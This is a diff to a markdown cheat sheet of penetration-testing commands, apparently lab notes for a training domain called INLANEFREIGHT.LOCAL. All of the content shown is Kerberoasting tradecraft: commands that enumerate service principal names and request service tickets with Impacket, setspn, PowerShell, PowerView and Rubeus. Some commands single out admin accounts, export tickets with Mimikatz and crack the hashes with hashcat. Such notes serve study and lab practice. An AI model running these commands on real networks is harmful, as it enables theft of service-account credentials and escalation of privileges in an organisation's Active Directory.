@@ -1353,12 +1353,16 @@ https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server
 ```
 # Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (-outputfile sqldev_tgs) linux-based host.
 impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
- 
-# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
-Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
 
-# Cracking Kerberos ticket hash
-hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
+# Enumerating SPNs with setspn.exe
+setspn.exe -Q */*
+
+# PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.
+Add-Type -AssemblyName System.IdentityModel 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+# Retrieving All Tickets Using setspn.exe
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 
 # Mimikatz command that ensures TGS tickets are extracted in base64 format from a Windows-based host.
 mimikatz # base64 /out:true
@@ -1379,13 +1383,21 @@ python2.7 kirbi2john.py sqldev.kirbi
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
 
 # Uses PowerView tool to extract TGS Tickets . Performed from a Windows-based host.
-Import-Module .\PowerView.ps1 Get-DomainUser * -spn | select samaccountname
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
 
 # PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for Hashcat from a Windows-based host.
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes --> checking support encryption types.
 
 # Used to request/download a TGS ticket for a specific user (/user:testspn) the formats the output in an easy to view & crack manner (/nowrap). Performed from a Windows-based host.
 .\Rubeus.exe kerberoast /user:testspn /nowrap
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+# Cracking Kerberos ticket hash
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force
+
 ```
 
 ##### ACL Enumeration and Tactics
